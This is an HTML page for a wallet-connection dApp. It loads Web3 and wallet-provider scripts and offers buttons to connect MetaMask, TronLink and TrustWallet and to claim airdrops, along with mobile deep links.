<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Wallet Interaction dApp</title>

  <!-- Link to external CSS file -->
  <link rel="stylesheet" href="css/styles.css">

  <!-- Web3.js CDN (MetaMask, TrustWallet, etc.) -->
  <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
  
  <!-- MetaMask CDN -->
  <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider"></script>

  <!-- TronLink CDN -->
  <script src="https://cdn.jsdelivr.net/npm/@tronlink/tronlink.js"></script>

  <!-- Include main JavaScript file -->
  <script src="js/javascript.js" defer></script>

  <!-- Debugging purposes -->
  <script>
    console.debug('index.html loaded');
  </script>
</head>

<body>
  <div class="container">
    <h1>Welcome to the Wallet Interaction dApp</h1>

    <!-- Buttons for connecting wallets and claiming airdrops -->
    <div id="wallet-buttons">
      <!-- MetaMask Connection and Airdrop Button -->
      <button id="connectButton">Connect MetaMask</button>
      <button id="claimAirdropButton" disabled>Claim Airdrop</button>

      <!-- TronLink Connection and Airdrop Button -->
      <button id="connectTronlinkButton">Connect TronLink</button>
      <button id="claimTronAirdropButton" disabled>Claim Tron Airdrop</button>

      <!-- TrustWallet Connection and Airdrop Button -->
      <button id="connectTrustwalletButton">Connect TrustWallet</button>
      <button id="claimTrustwalletAirdropButton" disabled>Claim TrustWallet Airdrop</button>
    </div>

    <!-- Mobile-specific instructions for deep-linking -->
    <div id="mobile-deep-link">
      <p id="mobile-message">Use the links below to connect on mobile:</p>
      <a href="metamask://">Connect MetaMask (Mobile)</a>
      <a href="tronlink://">Connect TronLink (Mobile)</a>
      <a href="trust://">Connect TrustWallet (Mobile)</a>
    </div>
  </div>

  <!-- Loading Screen (optional) -->
  <div id="loader" style="display:none;">Loading...</div>

</body>

</html>
